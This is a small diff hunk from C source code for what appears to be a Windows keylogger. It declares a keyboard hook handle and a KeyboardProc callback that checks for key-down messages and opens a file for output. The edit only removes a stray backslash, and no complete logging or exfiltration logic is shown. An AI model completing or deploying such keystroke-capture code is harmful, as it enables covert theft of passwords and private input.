@@ -3,7 +3,7 @@
 #include <stdio.h> 
 #include <fileapi.h>
 HHOOK hHook; 
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { \
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	FILE* out;
 	
 	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) { 
